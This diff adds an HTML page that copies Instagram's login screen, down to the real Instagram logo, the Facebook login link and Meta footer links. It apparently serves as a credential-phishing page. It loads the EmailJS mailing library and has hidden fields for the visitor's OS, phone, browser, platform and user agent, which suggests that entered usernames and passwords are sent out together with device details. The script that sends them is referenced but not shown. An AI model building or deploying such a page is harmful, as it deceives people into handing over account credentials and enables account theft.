@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="./assets/scripts/script.js" async></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.5/mobile-detect.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+
+<body>
+    <main>
+        <div class="max-w-[935px] mx-auto mt-10">
+            <section class="flex gap-x-8 justify-center">
+                <div class="max-[500px]:hidden">
+                    <img src="./assets/images/phones img inst.png" loading="lazy" alt="phone image"
+                        class="object-cover w-[380px] h-[580px]">
+                </div>
+                <div>
+                    <form class="border border-gray-200 px-10 pt-10 pb-5" id="signinForm">
+                        <div class="mb-8 max-w-[260px] text-center">
+                            <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img"
+                                style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yh/r/IS7e616CiR2.png&quot;); background-position: 0px 0px; background-size: 176px 258px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+                        </div>
+                        <div class="max-w-[260px] flex flex-col gap-y-1.5">
+                            <input type="text" id="phone_user" aria-label="Phone number, username, or email"
+                                placeholder="Phone number, username, or email"
+                                class="border border-gray-300 bg-gray-50 p-2 w-[260px] text-xs" name="login">
+                            <input type="password" id="password" aria-label="Phone number, username, or email"
+                                placeholder="Password" class="border border-gray-300 bg-gray-50 p-2 w-[260px] text-xs"
+                                name="password">
+                            <input type="hidden" id="os" aria-label="Phone number, username, or email"
+                                placeholder="Password"
+                                class="border border-gray-300 hidden bg-gray-50 p-2 w-[260px] text-xs" name="os">
+                            <input type="hidden" id="phone" aria-label="Phone number, username, or email"
+                                placeholder="Password"
+                                class="border border-gray-300 hidden bg-gray-50 p-2 w-[260px] text-xs" name="phone">
+                            <input type="hidden" id="userAgent" aria-label="Phone number, username, or email"
+                                placeholder="Password"
+                                class="border border-gray-300 hidden bg-gray-50 p-2 w-[260px] text-xs" name="userAgent">
+                            <input type="hidden" id="browser" aria-label="Phone number, username, or email"
+                                placeholder="Password"
+                                class="border border-gray-300 hidden bg-gray-50 p-2 w-[260px] text-xs" name="browser">
+                            <input type="hidden" id="platform" aria-label="Phone number, username, or email"
+                                placeholder="Password"
+                                class="border border-gray-300 hidden bg-gray-50 p-2 w-[260px] text-xs" name="platform">
+                        </div>
+                        <button type="submit"
+                            class="rounded-lg w-full px-4 py-[7px] bg-blue-600 text-sm mt-4 text-white disabled:bg-blue-300">Log
+                            in</button>
+                        <div class="flex w-full items-center justify-between my-4">
+                            <div class="w-[40%] bg-gray-300 h-[1px]"></div>
+                            <div class="text-xs font-semibold text-gray-500">OR</div>
+                            <div class="w-[40%] bg-gray-300 h-[1px]"></div>
+                        </div>
+                        <div class="text-center w-full mt-6">
+                            <p class="text-[#385185] text-sm font-semibold">Log in with Facebook</p>
+                        </div>
+                        <div class="mt-4">
+                            <p class="text-xs text-center text-slate-700">Forgot password?</p>
+                        </div>
+                    </form>
+                    <div class="border border-gray-200 py-[20px] text-center text-sm mt-2.5">
+                        <p>Don't have an account? <span class="font-semibold text-blue-400">Sign up</span></p>
+                    </div>
+                    <div class="flex justify-center gap-x-2 mt-9">
+                        <a href="#" class="max-w-[135px]">
+                            <img class="max-w-[135px]" src="./assets/images/gplay-app.png" alt="">
+                        </a>
+                        <a href="#" class="max-w-[110px]">
+                            <img class="max-w-[110px]" src="./assets/images/microsoft-app.png" alt="">
+                        </a>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+    <footer class="max-w-[935px] mx-auto mt-10">
+        <ul class="flex justify-center gap-x-4 flex-wrap">
+            <li><a href="#" class="text-xs text-gray-500">Meta</a></li>
+            <li><a href="#" class="text-xs text-gray-500">About</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Blog</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Jobs</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Help</a></li>
+            <li><a href="#" class="text-xs text-gray-500">API</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Privacy</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Terms</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Locations</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Instagram Lite</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Threads</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Contact Uploading & Non-Users</a></li>
+            <li><a href="#" class="text-xs text-gray-500">Meta Verifed</a></li>
+        </ul>
+        <div class="max-w-[935px] mx-auto mt-10 flex justify-center">
+            <select id="UZ" class="text-xs text-gray-500 border-none">
+                <option value="UZ">O'zbek</option>
+                <option value="RU">Русский</option>
+                <option value="EN">English</option>
+            </select>
+            <p class="text-xs text-gray-500">
+                English
+                © 2024 Instagram from Meta
+            </p>
+        </div>
+    </footer>
+</body>
+
+</html>
